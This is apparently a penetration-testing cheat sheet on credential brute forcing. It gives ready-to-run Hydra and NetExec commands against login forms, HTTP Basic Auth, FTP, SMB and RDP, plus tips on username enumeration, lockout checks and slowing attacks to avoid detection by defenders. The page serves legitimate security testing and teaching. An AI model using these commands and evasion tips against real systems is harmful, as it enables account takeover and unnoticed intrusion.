# Credential Brute Forcing

!!! tip "Tip"
    Username enumeration via timing or error message differences is often easier than brute-forcing. Confirm valid usernames first, then target those with a password list.

!!! warning "Watch out"
    Always check for account lockout before running hydra or Burp Intruder. A single locked account will alert a blue team immediately. Test with 2-3 attempts on a throwaway account first.

---

## Hydra
!!! tip "Non-Standart Port"
    Found a service running on a non-standard port? Use `-s x` to signify the port to work with hydra's built-in protocol tools. Example: `hydra -s 2121 -L users.list -P passwords.list ftp://$IP`

### HTTP Basic Authentication

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/dirb/wordlists/others/best1050.txt $IP http-get
```

### HTTP POST Form

```bash
hydra -L users.txt -P passwords.txt $IP http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
```

### SMB

```bash
hydra -L users.txt -P passwords.txt smb://$IP
```

---

## NetExec

### Web Authentication

```bash
nxc http $IP -u users.txt -p passwords.txt --auth-form /login.php
```

### SMB

```bash
nxc smb $IP -u users.txt -p passwords.txt
```

### RDP

```bash
nxc rdp $IP -u users.txt -p passwords.txt
```

---

## Lockout Prevention

- Use a slow attack rate: add delays between requests to reduce detection.
- Monitor response messages: some applications return different error messages for valid vs. invalid users.
